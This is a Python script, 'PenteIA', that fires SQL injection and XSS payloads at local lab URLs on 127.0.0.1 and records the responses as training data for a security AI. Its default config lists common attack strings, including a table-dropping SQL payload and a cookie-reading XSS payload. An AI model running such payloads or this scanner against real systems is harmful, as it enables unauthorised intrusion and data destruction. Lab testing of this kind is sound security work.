#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Script para coletar dados de vulnerabilidades de segurança em um ambiente de teste local.
Este script é usado para gerar dados para treinar uma IA de segurança.
"""

import requests
import pandas as pd
import os
import json
import time
import logging
from datetime import datetime
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from concurrent.futures import ThreadPoolExecutor
from requests.exceptions import RequestException, Timeout, ConnectionError

# Configurações padrão
CONFIG_FILE = 'config.json'
DEFAULT_CONFIG = {
    'urls_alvo': [
        'http://127.0.0.1/vulnerabilities/sqli/?id=1',
        'http://127.0.0.1/vulnerabilities/xss_r/?name=guest'
    ],
    'payloads': {
        'sqli': [
            "' or 1=1--",
            "1' AND '1'='1",
            "1' UNION SELECT 1,2,3--",
            "1'; DROP TABLE users--"
        ],
        'xss': [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(2)>",
            "javascript:alert(document.cookie)",
            "<svg onload=alert('XSS')>"
        ]
    },
    'headers': {
        'User-Agent': 'PenteIA-DataCollector/1.0'
    },
    'max_workers': 5,
    'timeout': 5,
    'output_file': 'raw_data.csv',
    'delay_between_requests': 0.5  # segundos
}

def carregar_config():
    """Carrega a configuração do arquivo ou cria um novo se não existir"""
    try:
        if os.path.exists(CONFIG_FILE):
            with open(CONFIG_FILE, 'r', encoding='utf-8') as f:
                config = json.load(f)
                logger.info(f"Configurações carregadas de {CONFIG_FILE}")
                return config
        else:
            with open(CONFIG_FILE, 'w', encoding='utf-8') as f:
                json.dump(DEFAULT_CONFIG, f, indent=4, ensure_ascii=False)
                logger.info(f"Arquivo de configuração {CONFIG_FILE} criado com valores padrão")
                return DEFAULT_CONFIG
    except Exception as e:
        logger.error(f"Erro ao carregar configurações: {str(e)}. Usando configurações padrão.")
        return DEFAULT_CONFIG

def extrair_parametros(url):

    parsed_url = urlparse(url)
    parametros = parse_qs(parsed_url.query)
    return parsed_url, parametros

def substituir_parametro(parsed_url, parametros, param_name, payload):
    """Substitui um parâmetro específico na URL por um payload"""
    # Cria uma cópia dos parâmetros para não modificar o original
    novos_params = {k: v for k, v in parametros.items()}
    novos_params[param_name] = [payload]

    # Reconstrói a query string com os novos parâmetros
    nova_query = urlencode(novos_params, doseq=True)

    # Reconstrói a URL completa
    nova_url = urlunparse((
        parsed_url.scheme,
        parsed_url.netloc,
        parsed_url.path,
        parsed_url.params,
        nova_query,
        parsed_url.fragment
    ))

    return nova_url

def testar_payload(url, param_name, tipo_payload, payload, config):
    """Testa um único payload em uma URL específica"""
    parsed_url, parametros = extrair_parametros(url)

    if param_name not in parametros:
        logger.warning(f"Parâmetro '{param_name}' não encontrado na URL: {url}")
        return None

    url_teste = substituir_parametro(parsed_url, parametros, param_name, payload)
    logger.debug(f"Testando URL: {url_teste}")

    # Adiciona um pequeno atraso para evitar sobrecarga no servidor alvo
    time.sleep(config['delay_between_requests'])

    try:
        # Fazendo a requisição GET com timeout configurável
        resposta = requests.get(
            url_teste, 
            timeout=config['timeout'], 
            headers=config['headers']
        )

        # Salvando os resultados em um dicionário
        resultado = {
            'url_original': url,
            'url_testada': url_teste,
            'tipo_payload': tipo_payload,
            'payload_usado': payload,
            'parametro': param_name,
            'status_code': resposta.status_code,
            'tamanho_resposta': len(resposta.text),
            'tempo_resposta': resposta.elapsed.total_seconds(),
            'timestamp': datetime.now().isoformat(),
            'html_resposta': resposta.text[:5000]  # Limita o tamanho para evitar arquivos muito grandes
        }

        logger.info(f"Payload testado: {payload} | Status: {resposta.status_code} | Tempo: {resultado['tempo_resposta']:.2f}s")
        return resultado

    except Timeout:
        logger.warning(f"Timeout ao testar payload {payload} em {url}")
        return {
            'url_original': url,
            'url_testada': url_teste,
            'tipo_payload': tipo_payload,
            'payload_usado': payload,
            'parametro': param_name,
            'status_code': None,
            'erro': "TIMEOUT",
            'timestamp': datetime.now().isoformat(),
        }
    except ConnectionError:
        logger.warning(f"Erro de conexão ao testar payload {payload} em {url}")
        return {
            'url_original': url,
            'url_testada': url_teste,
            'tipo_payload': tipo_payload,
            'payload_usado': payload,
            'parametro': param_name,
            'status_code': None,
            'erro': "CONNECTION_ERROR",
            'timestamp': datetime.now().isoformat(),
        }
    except RequestException as e:
        logger.warning(f"Erro ao testar payload {payload} em {url}: {str(e)}")
        return {
            'url_original': url,
            'url_testada': url_teste,
            'tipo_payload': tipo_payload,
            'payload_usado': payload,
            'parametro': param_name,
            'status_code': None,
            'erro': str(e),
            'timestamp': datetime.now().isoformat(),
        }

def detectar_parametros(url):
    """Detecta automaticamente os parâmetros em uma URL"""
    _, parametros = extrair_parametros(url)
    return list(parametros.keys())

def coletar_dados():
    """
    Função principal que coleta dados de vulnerabilidades.

    Itera sobre cada URL alvo e cada payload, faz requisições e 
    salva os resultados em um arquivo CSV.
    """
    # Carrega configurações
    config = carregar_config()

    logger.info(f"Iniciando coleta com {len(config['urls_alvo'])} URLs e {sum(len(payloads) for payloads in config['payloads'].values())} payloads")

    # Lista para armazenar os resultados das requisições
    resultados = []
    tarefas = []

    # Prepara as tarefas para execução
    for url in config['urls_alvo']:
        parametros = detectar_parametros(url)
        logger.info(f"URL: {url} | Parâmetros detectados: {parametros}")

        if not parametros:
            logger.warning(f"Nenhum parâmetro encontrado na URL: {url}")
            continue

        for param_name in parametros:
            for tipo_payload, lista_payloads in config['payloads'].items():
                for payload in lista_payloads:
                    # Adiciona a tarefa à lista
                    tarefas.append((url, param_name, tipo_payload, payload))

    # Executa as tarefas em paralelo com controle de concorrência
    with ThreadPoolExecutor(max_workers=config['max_workers']) as executor:
        futuros = []
        for url, param, tipo, payload in tarefas:
            future = executor.submit(testar_payload, url, param, tipo, payload, config)
            futuros.append(future)

        # Processa os resultados à medida que ficam prontos
        for future in futuros:
            resultado = future.result()
            if resultado:
                resultados.append(resultado)

    # Convertendo a lista de resultados em um DataFrame do pandas
    df_resultados = pd.DataFrame(resultados)

    # Criando diretório para resultados se não existir
    os.makedirs('resultados', exist_ok=True)

    # Nome do arquivo com timestamp
    output_file = f"resultados/{config['output_file'].replace('.csv', '')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"

    # Salvando o DataFrame como um arquivo CSV sem o índice
    df_resultados.to_csv(output_file, index=False)

    # Salvando uma versão resumida sem as respostas HTML para análise rápida
    colunas_resumo = [col for col in df_resultados.columns if col != 'html_resposta']
    if colunas_resumo:
        resumo_file = output_file.replace('.csv', '_resumo.csv')
        df_resultados[colunas_resumo].to_csv(resumo_file, index=False)

    logger.info(f"Coleta concluída. {len(resultados)} testes realizados.")
    logger.info(f"Dados completos salvos em '{output_file}'")
    logger.info(f"Resumo salvo em '{resumo_file}'")
    
    return df_resultados

def configurar_logging():
    """Configura o logging para o script"""
    # Criar diretório de logs se não existir
    os.makedirs('logs', exist_ok=True)

    # Nome do arquivo de log com timestamp
    log_filename = f'logs/coleta_{datetime.now().strftime("%Y%m%d_%H%M%S")}.log'

    # Configuração do logging
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s',
        handlers=[
            logging.FileHandler(log_filename),
            logging.StreamHandler()
        ]
    )
    return logging.getLogger()

def main():
    """Função principal do programa"""
    # Configurar logging
    global logger
    logger = configurar_logging()
    logger.info("Iniciando coleta de dados para treinamento de IA de segurança...")

    try:
        # Verificar se é necessário criar o arquivo de configuração
        if not os.path.exists(CONFIG_FILE):
            logger.info("Arquivo de configuração não encontrado. Criando configuração padrão...")
            config = carregar_config()
            logger.info("Configuração padrão criada com sucesso.")

        # Mostrar banner
        print("""
        ┌─────────────────────────────────────────────┐
        │ PenteIA - Coletor de Dados para Segurança   │
        │ Versão 2.0                                  │
        └─────────────────────────────────────────────┘
        """)

        # Executar coleta de dados
        inicio = time.time()
        resultados = coletar_dados()
        fim = time.time()

        # Mostrar estatísticas
        duracao = fim - inicio
        logger.info(f"Execução concluída em {duracao:.2f} segundos")
        logger.info(f"Total de testes realizados: {len(resultados)}")

        # Análise básica dos resultados
        if not resultados.empty:
            logger.info("Resumo dos resultados:")
            if 'status_code' in resultados.columns:
                status_counts = resultados['status_code'].value_counts()
                logger.info(f"Códigos de status: {dict(status_counts)}")

            if 'tipo_payload' in resultados.columns:
                payload_counts = resultados['tipo_payload'].value_counts()
                logger.info(f"Tipos de payload: {dict(payload_counts)}")

        return resultados

    except KeyboardInterrupt:
        logger.warning("Execução interrompida pelo usuário")
        return None
    except Exception as e:
        logger.error(f"Erro crítico durante a execução: {str(e)}")
        logger.exception("Detalhes do erro:")
        raise

if __name__ == "__main__":
    main()